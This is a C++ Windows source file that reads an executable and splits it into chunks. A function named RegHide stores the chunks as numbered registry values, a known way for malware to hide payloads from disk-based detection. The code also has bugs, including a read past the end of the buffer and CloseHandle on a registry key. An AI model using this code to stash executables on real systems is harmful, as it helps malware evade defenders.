#pragma once
#include <vector>
#include <array>
#include <string>
#include "globals.h"


#include "base64.h"
#include "WinReg.h"

NewPEInfo GetPEInfo(LPCSTR lpPathToExe)
{
	NewPEInfo processInfo = { 0 };

	// GET HANDLE TO EXE FILE
	HANDLE hFile = CreateFileA(lpPathToExe, GENERIC_READ, FILE_SHARE_READ,
		nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	// GET EXE FILE SIZE
	DWORD dwFileSize = GetFileSize(hFile, nullptr);


	//CHECK IF COULD GET FILE SIZE
	if (dwFileSize == -1)
	{
		fprintf(stderr, "Could not get size of file. ERROR: %X\n", GetLastError());
		exit(-1);
	}

	// INITIALIZE CLASS ATTRIBUTES
	processInfo.pFileData = std::unique_ptr<BYTE[]>(new BYTE[dwFileSize]);			//POINTER TO ARRAY CONTAINING FILE DATA
	processInfo.dwFileSize = dwFileSize;

	DWORD dwBytesRead = 0;

	// GET FILE DATA AND STORE IN BUFFER IN MEMORY
	bool bReadFileStatus = BOOLIFY(ReadFile(hFile, processInfo.pFileData.get(), dwFileSize, &dwBytesRead, nullptr));

	//CHECK IF COULD READ FILE
	if (!bReadFileStatus)
	{
		fprintf(stderr, "Could not read file. ERROR: %X\n", GetLastError());
		exit(-1);
	}

	//CHECK IF READ WAS COMPLETE
	if (dwBytesRead != dwFileSize)
	{
		fprintf(stderr, "Could not complete entire read.\n"
			"Bytes read = %ul -- Bytes that should be read = %ul\n",
			dwBytesRead, dwFileSize);
		exit(-1);
	}

	// INITIALIZE DOS & NT HEADERS
	processInfo.pDosHeader = (IMAGE_DOS_HEADER*)&(processInfo.pFileData.get()[0]);

	if (is64Bit)
	{
		processInfo.pNtHeaders64 = (IMAGE_NT_HEADERS64*)&(processInfo.pFileData.get()[processInfo.pDosHeader->e_lfanew]);
	}
	else
	{
		processInfo.pNtHeaders32 = (IMAGE_NT_HEADERS32*)&(processInfo.pFileData.get()[processInfo.pDosHeader->e_lfanew]);
	}


	CloseHandle(hFile);

	return processInfo;
}

std::vector<std::array<BYTE, READ_WRITE_SIZE>> SplitFile(LPCSTR pPathToFile)
{
	// INITIALIZE VECTOR CLASS (STORES ARRAYS OF READ_WRITE_SIZE BYTES)
	std::vector<std::array<BYTE, READ_WRITE_SIZE>> splitFile;

	NewPEInfo newProcessInfo = GetPEInfo(pPathToFile);
	for (DWORD i = 0; i < newProcessInfo.dwFileSize; i += READ_WRITE_SIZE)
	{
		std::array<BYTE, READ_WRITE_SIZE> splitArray = { 0 };
		memcpy(splitArray.data(), &newProcessInfo.pFileData.get()[i], READ_WRITE_SIZE);

		splitFile.push_back(splitArray);
	}

	return splitFile;
}

int RegHide(LPCSTR strPathToSourceFile, HKEY hRegPath, LPCSTR strRegKey, LPCSTR strValuePrefix)
{
	size_t ValueSuffix = 1;

	// SPLIT UP THE FILE
	auto splitFile = SplitFile(strPathToSourceFile);
	HKEY hKey = OpenRegKey(hRegPath, strRegKey);

	// ITERATE PER ARRAY IN VECTOR
	for (size_t i = 0; i < splitFile.size(); ++i)
	{
		// SET REG KEY VALUE NAME AS 'PART#'
		std::string strValueName(strValuePrefix + std::to_string(ValueSuffix));

		// B64 ENCODE THE BYTES THEN WRITE TO REGISTRY KEY VALUE AS REG_SZ
		WriteToRegKeyValue(hKey, strValueName.c_str(), splitFile[i].data(), READ_WRITE_SIZE);
		++ValueSuffix;
	}

	CloseHandle(hKey);
	return 0;
}